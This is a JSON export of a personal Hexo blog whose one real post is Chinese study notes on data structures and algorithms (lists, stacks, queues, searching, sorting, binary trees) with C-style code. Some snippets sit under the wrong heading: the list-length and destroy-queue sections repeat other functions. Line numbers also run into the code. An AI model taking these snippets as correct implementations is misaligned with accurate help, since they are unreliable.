{"meta":{"title":"Leon's blog😽","subtitle":"写些随笔","description":"想爱想吃想变成天上忽明忽暗的云","author":"Leon","url":"https://foreon.github.io","root":"/"},"pages":[{"title":"相册","date":"2023-11-02T13:43:04.000Z","updated":"2023-11-02T14:38:56.014Z","comments":true,"path":"gallery/index.html","permalink":"https://foreon.github.io/gallery/index.html","excerpt":"","text":"施工中。。。"},{"title":"categories","date":"2023-11-02T13:02:49.000Z","updated":"2023-11-02T13:02:49.852Z","comments":true,"path":"categories/index-1.html","permalink":"https://foreon.github.io/categories/index-1.html","excerpt":"","text":""},{"title":"关于我","date":"2023-11-02T14:26:00.000Z","updated":"2023-11-02T14:38:28.527Z","comments":true,"path":"about/index.html","permalink":"https://foreon.github.io/about/index.html","excerpt":"","text":"介绍下自己我是UESTC网络空间安全专业的一名本科生，目前在学习ctf。以后会在这个博客更新一些自己的学习经历和总结，可能也会存一些期末复习笔记（ 希望能保持一颗不断学习的心🙏🙏🙏"},{"title":"影视","date":"2023-11-02T14:22:29.000Z","updated":"2023-11-02T14:39:16.375Z","comments":true,"path":"movies/index.html","permalink":"https://foreon.github.io/movies/index.html","excerpt":"","text":"施工中。。。"},{"title":"音乐","date":"2023-11-02T14:22:10.000Z","updated":"2023-11-02T14:39:24.010Z","comments":true,"path":"music/index.html","permalink":"https://foreon.github.io/music/index.html","excerpt":"","text":"施工中。。。"},{"title":"留言板","date":"2023-11-02T13:04:09.000Z","updated":"2023-11-02T14:39:07.233Z","comments":true,"path":"messageboard/index.html","permalink":"https://foreon.github.io/messageboard/index.html","excerpt":"","text":"施工中。。。"},{"title":"Leon","date":"2023-11-02T13:07:38.000Z","updated":"2023-11-02T13:08:01.344Z","comments":true,"path":"myself/index.html","permalink":"https://foreon.github.io/myself/index.html","excerpt":"","text":""},{"title":"友链","date":"2023-11-02T13:04:17.000Z","updated":"2023-11-02T13:52:42.568Z","comments":true,"path":"link/index.html","permalink":"https://foreon.github.io/link/index.html","excerpt":"","text":""},{"title":"分类","date":"2023-11-02T05:06:39.000Z","updated":"2023-11-02T13:17:35.207Z","comments":true,"path":"categories/index.html","permalink":"https://foreon.github.io/categories/index.html","excerpt":"","text":""},{"title":"标签","date":"2023-11-02T05:07:08.000Z","updated":"2023-11-02T12:35:58.799Z","comments":true,"path":"tags/index.html","permalink":"https://foreon.github.io/tags/index.html","excerpt":"","text":""},{"title":"tags","date":"2023-11-02T12:35:20.000Z","updated":"2023-11-02T12:35:20.326Z","comments":true,"path":"tags/index-1.html","permalink":"https://foreon.github.io/tags/index-1.html","excerpt":"","text":""},{"title":"日志","date":"2023-11-02T13:06:13.000Z","updated":"2023-11-02T13:07:24.429Z","comments":true,"path":"timeline/index.html","permalink":"https://foreon.github.io/timeline/index.html","excerpt":"","text":""}],"posts":[{"title":"数据结构与算法笔记","slug":"数据结构与算法笔记","date":"2023-12-27T16:54:47.000Z","updated":"2023-12-27T16:55:56.304Z","comments":true,"path":"posts/11950.html","link":"","permalink":"https://foreon.github.io/posts/11950.html","excerpt":"","text":"数据结构与算法基本概念 数据(Data) ：是客观事物的符号表示。在计算机科学中指的是所有能输入到计算机中并被计算机程序处理的符号的总称。 数据元素(Data Element) ：是数据的基本单位，在程序中通常作为一个整体来进行考虑和处理。 一个数据元素可由若干个数据项(Data Item)组成。数据项是数据的不可分割的最小单位。数据项是对客观事物某一方面特性的数据描述。 数据对象(Data Object)：是性质相同的数据元素的集合，是数据的一个子集。如字符集合C&#x3D;{’A’,’B’, ‘C’,…} 。 数据的逻辑结构数据结构(Data Structure)：是指相互之间具有(存在)一定联系(关系)的数据元素的集合。元素之间的相互联系(关系)称为逻辑结构。数据元素之间的逻辑结构有四种基本类型， 集合：结构中的数据元素除了“同属于一个集合”外，没有其它关系。 线性结构：结构中的数据元素之间存在一对一的关系。 树型结构：结构中的数据元素之间存在一对多的关系。 图状结构：结构中的数据元素之间存在多对多的关系。 数据的存储结构 顺序存储结构：用数据元素在存储器中的相对位置来表示数据元素之间的逻辑结构(关系)。 链式存储结构：在每一个数据元素中增加一个存放另一个元素地址的指针(pointer)，用该指针来表示数据元素之间的逻辑结构(关系)。 抽象数据类型ADT 算法与数据分析常量($c$) &lt; 对数($\\log_2n$) &lt;$\\log_2^2n$ &lt; 线性($n$) &lt; $nlogn$ &lt; 平方($n^2$) &lt;立方($n^3$) &lt; 指数($2^n$) &lt; 阶乘($n!$) 线性表顺序表顺序表定义123456#define MAXSIZE 100 //最大长度typedef struct &#123; ElemType *elem; //指向数据元素的基地址 int length; //顺序表的当前长度 int listsize; //顺序表初始分配的空间大小 &#125;SqList； 初始化顺序表使用引用 1234567Status InitList_Sq(SqList &amp;L)&#123; //构造一个空的顺序表L L.elem=new ElemType[MAXSIZE]; //为顺序表分配空间 if(!L.elem) exit(OVERFLOW); //存储分配失败 L.length=0; //空表长度为0 L.listsize=MAXSIZE; return OK;&#125; 使用指针 1234567Status InitList_Sq(SqList *L)&#123; //构造一个空的顺序表L L-&gt; elem=new ElemType[MAXSIZE]; //为顺序表分配空间 if(! L-&gt; elem) exit(OVERFLOW); //存储分配失败 L-&gt; length=0; //空表长度为0 L-&gt; listsize=MAXSIZE; return OK;&#125; 销毁顺序表123456789Status DestroyList(SqList &amp;L)&#123; if (L.elem) &#123; delete L.elem; //释放存储空间 L.elem=NULL; L.length=0; L.listsize=0; &#125; return OK;&#125; 清空顺序表123456Status ClearList(SqList &amp;L) &#123; L.length=0; //将顺序表的长度置为0 return OK;&#125; 求顺序表长度12345Status ClearList(SqList &amp;L) &#123; L.length=0; //将顺序表的长度置为0 return OK;&#125; 判断顺序表是否为空12345int IsEmpty(SqList L)&#123; if (L.length==0) return 1; else return 0;&#125; 获取顺序表的指定元素位置12345int IsEmpty(SqList L)&#123; if (L.length==0) return 1; else return 0;&#125; 查找指定值的元素位置123456int LocateElem(SqList L,ElemType e)&#123; for (i=0;i&lt; L.length;i++) if (L.elem[i]==e) return i+1; return 0;&#125; 在顺序表中插入元素插入算法主要耗时在移动元素上 123456789Status ListInsert_Sq(SqList &amp;L,int i ,ElemType e)&#123; if(i&lt;1 || i&gt;L.length+1) return ERROR; //i值不合法 if(L.length==L.listsize) return ERROR; //当前存储空间已满 for(j=L.length-1;j&gt;=i-1;j--) L.elem[j+1]=L.elem[j]; //插入位置及之后的元素后移 L.elem[i-1]=e; //将新元素e放入第i个位置 L.length++; //表长加1 return OK;&#125; 在线性表中删除元素同样耗时在移动元素上 12345678Status ListDelete_Sq(SqList &amp;L,int i,ElemType &amp;e)&#123; if((i&lt;1)||(i&gt;L.length)) return ERROR; //i值不合法 e=L.elem[i-1]; //将欲删除的元素保留在e中 for (j=i;j&lt;=L.length-1;j++) L.elem[j-1]=L.elem[j]; //被删除元素之后的元素前移 --L.length; //表长减1 return OK;&#125; 顺序表优缺点优点： 存储密度大（结点本身所占存储量&#x2F;结点结构所占存储量） 可以随机存取表中任一元素 缺点： 在插入、删除某一元素时，需要移动大量元素 浪费存储空间 属于静态存储形式，数据元素的个数不能自由扩充 随机存取法 链表头结点 使用头节点的好处： 便于首元结点的处理首元结点的地址保存在头结点的指针域中,所以在链表的第一个位置上的操作和其它位置一致，无须进行特殊处理; 便于空表和非空表的统一处理无论链表是否为空，头指针都是指向头结点的非空指针，因此空表和非空表的处理也就统一了。 顺序存储法 链表优缺点优点： 数据元素的个数可以自由扩充 插入、删除等操作不必移动数据，只需修改链接指针，修改效率较高 缺点： 存储密度小 存取效率不高，必须采用顺序存取，即存取数据元素时，只能按链表的顺序进行访问（顺藤摸瓜） 单链表定义12345typedef struct LNode&#123; ElemType data; //数据域 struct LNode *next; //指针域&#125;LNode,*LinkList; // LinkList为Lnode类型的指针 初始化123456Status InitList_L(LinkList &amp;L)&#123; L=new LNode; if (!L) exit(OVERFLOW); L-&gt;next=NULL; return OK; &#125; 销毁12345678910Status DestroyList_L(LinkList &amp;L)&#123; LinkList p; while(L) &#123; p=L; L=L-&gt;next; delete p; &#125; return OK; &#125; 或者 123456789LinkList p = L; while(p)&#123; q = p-&gt;next; delete p; p=q; &#125; L=NULL; return OK;&#125; 清空123456789Status ClearList(LinkList &amp;L)&#123;// 将L重置为空表 LinkList p; while(L-&gt;next) &#123; p=L-&gt;next; L-&gt;next =p-&gt;next; delete p; &#125; return OK;&#125; 或者 12345678LinkList p = L-&gt;next, q; while(p)&#123; q=p-&gt;next; delete p; p=q;&#125; L-&gt;next=NULL; return OK;&#125; 求表长12345678910int ListLength_L(LinkList L)&#123;//返回L中数据元素个数 LinkList p; p=L-&gt;next; //p指向第一个结点 j=0; while(p)&#123; //遍历单链表,统计结点数 j++; p=p-&gt;next; &#125; return j; &#125; 判断表是否为空1234567int ListEmpty(LinkList L)&#123; //若L为空表，则返回1，否则返回0 if(L-&gt;next) //非空 return 0; else return 1; &#125; 获取表中第n个元素123456789Status GetElem_L(LinkList L,int i,ElemType &amp;e)&#123; p=L-&gt;next;j=1; //初始化 while(p&amp;&amp;j&lt;i)&#123; //向后扫描，直到p指向第i个元素或p为空 p=p-&gt;next; ++j; &#125; if(!p || j&gt;i)return ERROR; //第i个元素不存在 e=p-&gt;data; //取第i个元素 return OK; &#125;//GetElem_L 获取表中值为e的元素123456LNode *LocateElem_L (LinkList L，Elemtype e) &#123; p=L-&gt;next; while(p &amp;&amp;p-&gt;data!=e) p=p-&gt;next; return p; //返回L中值为e的数据元素的位置，查找失败返回NULL &#125; 插入元素12345678910Status ListInsert_L(LinkList &amp;L,int i,ElemType e)&#123; p=L;j=0; while(p&amp;&amp;j&lt;i−1)&#123;p=p-&gt;next;++j;&#125; //寻找第i−1个结点 if(!p||j&gt;i−1)return ERROR; //i大于表长 + 1或者小于1 s=new LNode; //生成新结点s s-&gt;data=e; //将结点s的数据域置为e s-&gt;next=p-&gt;next; //将结点s插入L中 p-&gt;next=s; return OK; &#125;//ListInsert_L 若无头节点 123456789101112131415Status ListInsert_L(LinkList &amp;L,int i,ElemType e)&#123; //添加这一段----------------------------------------- if(!L&amp;&amp;i!=1) return ERROR; if(i==1) &#123; s=new LNode; s-&gt;data=e; s-&gt;next=L; L=s; return OK;&#125; //-------------------------------------------------- p=L;j=1; while(p&amp;&amp;j&lt;i−1)&#123;p=p-&gt;next;++j;&#125; //寻找第i−1个结点 if(!p||j&gt;i−1)return ERROR; //i大于表长 + 1或者小于1 s=new LNode; //生成新结点s s-&gt;data=e; //将结点s的数据域置为e s-&gt;next=p-&gt;next; //将结点s插入L中 p-&gt;next=s; return OK; &#125;//ListInsert_L 删除元素1234567891011Status ListDelete_L(LinkList &amp;L,int i,ElemType &amp;e)&#123; p=L;j=0; while(p-&gt;next &amp;&amp;j&lt;i-1)&#123;//寻找第i个结点，并令p指向其前驱 p=p-&gt;next; ++j; &#125; if(!(p-&gt;next)||j&gt;i-1) return ERROR; //删除位置不合理 q=p-&gt;next; //临时保存被删结点的地址以备释放 p-&gt;next=q-&gt;next; //改变删除结点前驱结点的指针域 e=q-&gt;data; //保存删除结点的数据域 delete q; //释放删除结点的空间 return OK; &#125;//ListDelete_L 若无头结点 123456789101112Status ListDelete_L(LinkList &amp;L,int i,ElemType &amp;e)&#123; if(!L) return ERROR; if(i==1) &#123;p=L; L=L-&gt;next; delete p; return OK;&#125; p=L;j=1; while(p-&gt;next &amp;&amp;j&lt;i-1)&#123;p=p-&gt;next; ++j; &#125; if(!(p-&gt;next)||j&gt;i-1) return ERROR; //删除位置不合理 q=p-&gt;next; //临时保存被删结点的地址以备释放 p-&gt;next=q-&gt;next; //改变删除结点前驱结点的指针域 e=q-&gt;data; //保存删除结点的数据域 delete q; //释放删除结点的空间 return OK; &#125;//ListDelete_L 建立链表前插法 123456789void CreateList_F(LinkList &amp;L,int n)&#123; L=new LNode; L-&gt;next=NULL; //先建立一个带头结点的单链表 for(i=n;i&gt;0;--i)&#123; p=new LNode; //生成新结点 cin&gt;&gt;p-&gt;data; //输入元素值 p-&gt;next=L-&gt;next;L-&gt;next=p; //插入到表头 &#125; &#125;//CreateList_F 尾插法 123456789101112void CreateList_L(LinkList &amp;L,int n)&#123; //正位序输入n个元素的值，建立带表头结点的单链表L L=new LNode; L-&gt;next=NULL; r=L; //尾指针r指向头结点 for(i=0;i&lt;n;++i)&#123; p=new LNode; //生成新结点 cin&gt;&gt;p-&gt;data; //输入元素值 p-&gt;next=NULL; r-&gt;next=p; //插入到表尾 r=p; //r指向新的尾结点 &#125; &#125;//CreateList_L 有序链表的合并12345678void MergeList_L(LinkList &amp;La,LinkList &amp;Lb,LinkList &amp;Lc)&#123; pa=La-&gt;next; pb=Lb-&gt;next; pc=Lc=La; //用La的头结点作为Lc的头结点 while(pa &amp;&amp; pb)&#123; if(pa-&gt;data&lt;=pb-&gt;data)&#123; pc-&gt;next=pa;pc=pa;pa=pa-&gt;next;&#125; else&#123;pc-&gt;next=pb; pc=pb; pb=pb-&gt;next;&#125; pc-&gt;next=pa?pa:pb; //插入剩余段 delete Lb; //释放Lb的头结点&#125; 双链表12345typedef struct DuLNode&#123; ElemType data; struct DuLNode *prior; struct DuLNode *next; &#125;DuLNode, *DuLinkList 双链表的插入12345678910Status ListInsert_DuL(DuLinkList &amp;L,int i,ElemType e)&#123; if(!(p=GetElemP_DuL(L,i))) return ERROR; s=new DuLNode; s-&gt;data=e; s-&gt;prior=p-&gt;prior; p-&gt;prior-&gt;next=s; s-&gt;next=p; p-&gt;prior=s; return OK;&#125; 双链表的删除12345678Status ListDelete_DuL(DuLinkList &amp;L,int i,ElemType &amp;e)&#123; if(!(p=GetElemP_DuL(L,i))) return ERROR; e=p-&gt;data; p-&gt;prior-&gt;next=p-&gt;next; p-&gt;next-&gt;prior=p-&gt;prior; delete p; return OK;&#125; 栈和队列顺序栈 顺序栈的定义1234567#define MAXSIZE 100typedef struct&#123; SElemType *base; SElemType *top; int stacksize;&#125;SqStack; 顺序栈的初始化1234567Status InitStack( SqStack &amp;S )&#123; S.base =new SElemType[MAXSIZE]； if( !S.base ) return OVERFLOW; S.top = S.base; S.stackSize = MAXSIZE; return OK;&#125; 判断是否为空12345bool StackEmpty( SqStack S )&#123; if(S.top == S.base) return true; else return false;&#125; 求顺序栈的长度1234int StackLength( SqStack S )&#123; return S.top – S.base;&#125; 清空顺序栈12345Status ClearStack( SqStack &amp;S )&#123; if( S.base ) S.top = S.base; return OK;&#125; 销毁顺序栈12345678Status DestroyStack( SqStack &amp;S )&#123; if( S.base )&#123; delete S.base ; S.stacksize = 0; S.base = S.top = NULL; &#125; return OK;&#125; 进栈1234567Status Push( SqStack &amp;S, SElemType e) &#123; if( S.top - S.base== S.stacksize ) // 栈满 return ERROR; *S.top++=e; return OK;&#125; 出栈1234567Status Pop( SqStack &amp;S, SElemType &amp;e) &#123; if( S.top == S.base ) // 栈空 return ERROR; e＝ *--S.top; return OK;&#125; 取顺序栈栈顶元素123456Status GetTop( SqStack S, SElemType &amp;e) &#123; if( S.top == S.base ) return ERROR; // 栈空 e = *( S.top – 1 ); return OK;&#125; 链栈运算受限的单链表，只能在链表头部进行操作，故没有必要附加头结点。栈顶指针就是链表的头指针 定义1234typedef struct StackNode &#123; SElemType data; //数据域 struct StackNode *next; //指针域 &#125; StackNode, *LinkStack; 初始化1234void InitStack(LinkStack &amp;S )&#123; S=NULL;&#125; 判断是否为空1234567Status StackEmpty(LinkStack S) &#123; if (S == NULL) &#123; return TRUE; &#125; else &#123; return FALSE; &#125;&#125; 进栈12345678910Status Push(LinkStack &amp;S, SElemType e) &#123; p = new StackNode; // 生成新结点p if (!p) &#123; exit(OVERFLOW); &#125; p-&gt;data = e; p-&gt;next = S; S = p; return OK;&#125; 出栈123456789Status Pop (LinkStack &amp;S,SElemType &amp;e)&#123;if (S==NULL) return ERROR;e = S-&gt; data; p = S; S = S-&gt; next;delete p; return OK; &#125; 取栈顶元素1234567SElemType GetTop(LinkStack S) &#123; if (S == NULL) &#123; exit(1); &#125; else &#123; return S-&gt;data; &#125;&#125; 循环队列定义123456#define M 100 //最大队列长度Typedef struct &#123; QElemType *base; //初始化的动态分配存储空间 int front; //头指针 int rear; //尾指针&#125;SqQueue; 解决假溢出问题 初始化123456Status InitQueue (SqQueue &amp;Q)&#123; Q.base =new QElemType[MAXQSIZE] ; if(!Q.base) exit(OVERFLOW); Q.front=Q.rear=0; return OK;&#125; 求循环队列的长度123int QueueLength (SqQueue Q)&#123; return (Q.rear-Q.front+MAXQSIZE)%MAXQSIZE; &#125; 入队123456Status EnQueue(SqQueue &amp;Q,QElemType e)&#123; if((Q.rear+1)%MAXQSIZE==Q.front) return ERROR; Q.base[Q.rear]=e; Q.rear=(Q.rear+1)%MAXQSIZE; return OK; &#125; 出队123456Status DeQueue (LinkQueue &amp;Q,QElemType &amp;e)&#123; if(Q.front==Q.rear) return ERROR; e=Q.base[Q.front]; Q.front=(Q.front+1)%MAXQSIZE; return OK;&#125; 链队列 定义12345678typedef struct QNode&#123; QElemType data; struct Qnode *next;&#125;Qnode, *QueuePtr;typedef struct &#123; QueuePtr front; //队头指针 QueuePtr rear; //队尾指针&#125;LinkQueue; 初始化123456Status InitQueue (LinkQueue &amp;Q)&#123; Q.front=Q.rear=(QueuePtr) malloc(sizeof(QNode)); if(!Q.front) exit(OVERFLOW); Q.front-&gt;next=NULL; return OK;&#125; 销毁链队列123456Status InitQueue (LinkQueue &amp;Q)&#123; Q.front=Q.rear=(QueuePtr) malloc(sizeof(QNode)); if(!Q.front) exit(OVERFLOW); Q.front-&gt;next=NULL; return OK;&#125; 判断链队列是否为空123Status QueueEmpty (LinkQueue Q)&#123; return (Q.front==Q.rear); &#125; 求链队列对头元素12345Status GetHead (LinkQueue Q, QElemType &amp;e)&#123; if(Q.front==Q.rear) return ERROR; e=Q.front-&gt;next-&gt;data; return OK;&#125; 链队列入队12345678Status EnQueue(LinkQueue &amp;Q,QElemType e)&#123; p=(QueuePtr)malloc(sizeof(QNode)); if(!p) exit(OVERFLOW); p-&gt;data=e; p-&gt;next=NULL; Q.rear-&gt;next=p; Q.rear=p; return OK;&#125; 不带头结点 12345678910111213141516Status EnQueue(LinkQueue &amp;Q, QElemType e) &#123; p = (QueuePtr)malloc(sizeof(QNode)); if (!p) &#123; exit(OVERFLOW); &#125; p-&gt;data = e; p-&gt;next = NULL; if (Q.front == NULL) &#123; Q.front = p; Q.rear = p; return OK; &#125; Q.rear-&gt;next = p; Q.rear = p; return OK;&#125; 带头结点的链队的入队操作，只要把新生成的结点加到尾结点后即可 而不带头结点的操作则还要注意到边界操作，假如是第一次入队，需修改队头指针。 同样的道理，对于出队操作，假如是最后一个结点出队，需要注意修改队尾指针 由此，我们建议链式队列好采用带头结点的实现方式。 链队列出队123456789Status DeQueue (LinkQueue &amp;Q,QElemType &amp;e)&#123; if(Q.front==Q.rear) return ERROR; p=Q.front-&gt;next; e=p-&gt;data; Q.front-&gt;next=p-&gt;next; if(Q.rear==p) Q.rear=Q.front; free(p); return OK;&#125; 多维数组 分治算法 分治算法的适用条件 该问题规模缩小到一定的程度就可以容易地解决 该问题可以分解为若干个规模较小的相同问题，即该问题具有递归子结构性质 利用该问题分解出的子问题的解可以合并为该问题的解 该问题所分解出的各个子问题是相互独立的，即子问题之间不包含公共的子问题 分治算法的复杂性分析 排序和搜索合并排序主要思想： 将数组分成均匀两半（divide）. 递归解决每个半部分（sort）. 把两部分合并起来组成一个新的排序（merge）. 算法实现 合并函数Merge的实现 合并排序的计算时间递归树展开 直接展开 数学归纳 快速排序基本思想 算法实现 快速排序的计算时间 二分搜索&#x2F;折半查找算法和时间复杂度 递归式求解三种常用方法： 归纳法 展开法 主方法 主方法 主定理 举例 特殊情况 查找顺序查找 改进：把待查关键字key存入表头（“哨兵”），从后向前逐个比较，可免去查找过程中每一步都要检测是否查找完毕，加快速度。 12345678int Search_Seq( SSTable ST , KeyType key )&#123; //若成功返回其位置信息，否则返回0 ST.R[0].key =key; for( i=ST.length; ST.R[ i ].key!=key; - - i ); //不用for(i=n; i&gt;0; - -i) 或 for(i=1; i&lt;=n; i++) return i; &#125; 空间复杂度：一个辅助空间。 时间复杂度： 查找成功时的平均查找长度设表中各记录查找概率相等$ASL_s(n)&#x3D;(1+2+ … +n)&#x2F;n &#x3D;(n+1)&#x2F;2$ 查找不成功时的平均查找长度 $ASL_f &#x3D;n+1$ 折半查找12345678910int Search_Bin(SSTable ST,KeyType key)&#123;//若找到，则函数值为该元素在表中的位置，否则为0 low=1;high=ST.length; while(low&lt;=high)&#123; mid=(low+high)/2; if(key==ST.R[mid].key) return mid; else if(key&lt;ST.R[mid].key) high=mid-1;//前一子表查找 else low=mid+1; //后一子表查找 &#125; return 0; //表中不存在待查元素&#125; 递归方式 123456789int Search_Bin (SSTable ST, keyType key, int low, int high) &#123; if(low&gt;high) return 0; //查找不到时返回0 mid=(low+high)/2; if(key等于ST.elem[mid].key) return mid; else if(key小于ST.elem[mid].key) ……..//递归 else……. //递归&#125; 查找过程：每次将待查记录所在区间缩小一半，比顺序查找效率高,时间复杂度$O(\\log_2n)$ 适用条件：采用顺序存储结构的有序表，不宜用于链式结构 索引表的查找 分块查找 分块查找分块有序，即分成若干子表，要求每个子表中的数值都比后一块中数值小（但子表内部未必有序）。然后将各子表中的最大关键字构成一个索引表，表中还要包含每个子表的起始地址（即头指针）。 分块查找过程 对索引表使用折半查找法（因为索引表是有序表）； 确定了待查关键字所在的子表后，在子表内采用顺序查找法（因为各子表内部是无序表）； 分块查找性能分析 分块查找优缺点优点：插入和删除比较容易，无需进行大量移动。 缺点：要增加一个索引表的存储空间并对初始索引表进行排序运算。 适用情况：如果线性表既要快速查找又经常动态变化，则可采用分块查找。 哈希表查找有关术语哈希方法：选取某个函数，依该函数按关键字计算元素的存储位置，并按此存放；查找时，由同一个函数对给定值k计算地址，将k与地址单元中元素关键码进行比较，确定查找是否成功。 哈希函数：哈希方法中使用的转换函数 冲突不可避免，哈希方法一般采用除留余数法。 哈希表的查找 哈希表的查找效率分析 ASL与装填因子$\\alpha$有关！既不是严格的$O(1)$，也不是$O(n)$ 哈希表的平均查找长度是装填因子$\\alpha$的函数，而不是 $n$ 的函数。 这说明，用哈希表构造查找表时，可以选择一个适当的装填因子 $\\alpha$，使得平均查找长度限定在某个范围内。 几点结论 对哈希表技术具有很好的平均性能，优于一些传统的技术 链地址法优于开放地址法 除留余数法作哈希函数优于其它类型函数 排序排序算法的好坏如何衡量？ 时间效率——排序速度（比较次数与移动次数） 空间效率——占内存辅助空间的大小 稳定性——A和B的关键字相等，排序后A、B的先后次序保持不变，则称这种排序算法是稳定的。否则就是不稳定的。 插入排序 直接插入排序 折半插入排序 希尔排序 直接插入排序是最简单的排序法 直接插入排序 1234567891011void InsertSort(SqList ＆L) &#123;int i,j; for(i=2;i&lt;=L.length;++i) if( L.r[i].key&lt;L.r[i-1].key)//将L.r[i]插入有序子表 &#123; L.r[0]=L.r[i]; // 复制为哨兵 L.r[i]=L.r[i-1]; for(j=i-2; L.r[0].key&lt;L.r[j].key;--j) L.r[j+1]=L.r[j]; // 记录后移 L.r[j+1]=L.r[0]; //插入到正确位置 &#125; &#125; 时间复杂度为 $O(n^2)$空间复杂度为 $O(1)$是一种稳定的排序方法 折半查找前面的ppt好像讲过了？ 12345678910111213Status BInsertSort ( SqList &amp;L ) &#123; for ( i = 2; i &lt;= L.length ; ++i ) &#123; L.r[0] = L.r[i]; low = 1 ; high = i-1 ; while ( low &lt;= high ) &#123; m = ( low + high ) / 2 ; if ( LT( L.r[0].key , L.r[m]. key ) ) high = m -1 ; else low = m + 1; &#125; for ( j=i-1; j&gt;=high+1; - - j ) L.r[j+1] = L.r[j]; L.r[high+1] = L.r[0]; &#125; &#125; // BInsertSort 折半查找比顺序查找快，所以折半插入排序就平均性能来说比直接插入排序要快 当 n 较大时，总关键码比较次数比直接插入排序的最坏情况要好得多，但比其最好情况要差在对象的初始排列已经按关键码排好序或接近有序时，直接插入排序比折半插入排序执行的关键码比较次数要少折半插入排序的对象移动次数与直接插入排序相同，依赖于对象的初始排列 减少了比较次数，但没有减少移动次数平均性能优于直接插入排序 时间复杂度为 $O(n^2)$空间复杂度为 $O(1)$是一种稳定的排序方法 希尔排序先将整个待排记录序列分割成若干子序列,分别进行直接插入排序，待整个序列中的记录“基本有序”时，再对全体记录进行一次直接插入排序。 123456void ShellSort(SqList &amp;L，int delta[ ]，int t)&#123; //按增量序列delta[0…t-1]对顺序表L作Shell排序 for(k=0；k&lt;t；++k) ShellInsert(L，delta[k])； //增量为delta[k]的一趟插入排序&#125; // ShellSort 交换排序两两比较，如果发生逆序则交换，直到所有记录都排好序为止。 冒泡排序$O(n^2)$快速排序$O( n\\log_2n )$ 冒泡排序12345678910111213void bubble_sort(SqList &amp;L)&#123; int m,i,j,flag=1; RedType x; m=n-1; while((m&gt;0)&amp;&amp;(flag==1)) &#123; flag=0; for(j=1;j&lt;=m;j++) if(L.r[j].key&gt;L.r[j+1].key) &#123; flag=1; x=L.r[j];L.r[j]=L.r[j+1];L.r[j+1]=x; //交换 &#125;//endif m--; &#125;//endwhile&#125; 时间复杂度为 $O(n^2)$空间复杂度为 $O(1)$是一种稳定的排序方法 快速排序前面也讲过了 ①每一趟的子表的形成是采用从两头向中间交替式逼近法； ②由于每趟中对各子表的操作都相似，可采用递归算法。 12345678910111213141516171819void QSort ( SqList &amp;L，int low, int high ) &#123; if ( low &lt; high ) &#123; pivotloc = Partition(L, low, high ) ; Qsort (L, low, pivotloc-1) ; Qsort (L, pivotloc+1, high ) &#125;&#125;int Partition ( SqList &amp;L，int low, int high ) &#123; L.r[0] = L.r[low]; pivotkey = L.r[low].key; while ( low &lt; high ) &#123; while ( low &lt; high &amp;&amp; L.r[high].key &gt;= pivotkey ) --high; L.r[low] = L.r[high]; while ( low &lt; high &amp;&amp; L.r[low].key &lt;= pivotkey ) ++low; L.r[high] = L.r[low]; &#125; L.r[low]=L.r[0]; return low;&#125; 可以证明，平均计算时间是$O(n\\log_2n)$。实验结果表明：就平均计算时间而言，快速排序是我们所讨论的所有内排序方法中最好的一个。快速排序是递归的，需要有一个栈存放每层递归调用时参数（新的low和high）。最大递归调用层次数与递归树的深度一致，因此，平均情况下空间复杂度为$O(\\log_2n)$，最坏情况下为$O(n)$ 。 时间复杂度：$O(n^2) $平均时间效率：$O(n\\log_2n) $空间效率：$O(n)$—递归要用到栈空间稳 定 性： 不稳定 —可选任一元素为支点。 归并排序排序过程初始序列看成n个有序子序列，每个子序列长度为1两两合并，得到$\\lfloor$n&#x2F;2$\\rfloor$个长度为2或1的有序子序列再两两合并，重复直至得到一个长度为n的有序序列为止 时间效率：$O(n\\log_2n) $空间效率：$O(n)$稳 定 性：稳定 选择排序前面讲过了 每一趟在后面 $n-i +1$个中选出关键码最小的对象, 作为有序序列的第$ i $个记录 12345678910void SelectSort(SqList &amp;K) &#123; for (i=1; i&lt;L.length; ++i) &#123; //在L.r[i..L.length] 中选择key最小的记录 k=i; for( j=i+1;j&lt;=L.length ; j++) if ( L.r[j].key &lt;L.r[k].key) k=j; if(k!=i)L.r[i]←→L.r[k]; &#125; &#125; 时间复杂度：$O(n²)$空间复杂度：$O(1)$不稳定 堆排序堆的定义 基本思想 有n 个结点的完全二叉树，最后一个分支结点的标号是$\\lfloor$$\\frac{n}{2}$$\\rfloor$ 将根结点r[1]与左、右子树根结点比较，并与大者交换重复直至叶子结点，得到新的堆 时间效率：$O(n\\log_2n) $空间效率：$O(1)$稳 定 性：不稳定适用于$n$ 较大的情况 树和二叉树二叉树是有序树（子树有序，不能颠倒） 性质1: 在二叉树的第i层上至多有$2^i-1$个结点 性质2: 深度为k的二叉树至多有$2^k-1$个结点 性质3: 对于任何一棵二叉树，若2度的结点数有$n_2$个，则叶子数$n_0$必定为$n_2＋1 $（即$n_0&#x3D;n_2+1$） 性质4: 具有n个结点的完全二叉树的深度必为$⌊log2n⌋+1$ 性质5: 对完全二叉树，若从上至下、从左至右编号，则编号为i 的结点，其左孩子编号必为2i，其右孩子编号必为2i＋1；其双亲的编号必为i&#x2F;2。 满二叉树和完全二叉树 满二叉树是叶子一个也不少的树，而完全二叉树虽然前n-1层是满的，但最底层却允许在右边缺少连续若干个结点。满二叉树是完全二叉树的一个特例。 对n个元素组成的有序顺序表进行折半查找时，查找成功时的比较次数最多为$⌊log2n⌋+1$ 二叉链表1234typedef struct BiNode&#123; TElemType data; struct BiNode *lchild,*rchild; //左右孩子指针&#125;BiNode,*BiTree; 12typedef struct TriTNode&#123; TelemType data; struct TriTNode *lchild,*parent,*rchild; &#125;TriTNode,*TriTree;//三叉链表 遍历二叉树先序 12345678Status PreOrderTraverse(BiTree T)&#123; if(T==NULL) return OK; //空二叉树 else&#123; cout&lt;&lt;T-&gt;data; //访问根结点 PreOrderTraverse(T-&gt;lchild); //递归遍历左子树 PreOrderTraverse(T-&gt;rchild); //递归遍历右子树 &#125;&#125; 中序 12345678Status InOrderTraverse(BiTree T)&#123; if(T==NULL) return OK; //空二叉树 else&#123; InOrderTraverse(T-&gt;lchild); //递归遍历左子树 cout&lt;&lt;T-&gt;data; //访问根结点 InOrderTraverse(T-&gt;rchild); //递归遍历右子树 &#125;&#125; 后序 12345678Status PostOrderTraverse(BiTree T)&#123; if(T==NULL) return OK; //空二叉树 else&#123; PostOrderTraverse(T-&gt;lchild); //递归遍历左子树 PostOrderTraverse(T-&gt;rchild); //递归遍历右子树 cout&lt;&lt;T-&gt;data; //访问根结点 &#125;&#125; 效率 时间效率:O(n) &#x2F;&#x2F;每个结点只访问一次 空间效率:O(n) &#x2F;&#x2F;栈占用的最大辅助空间 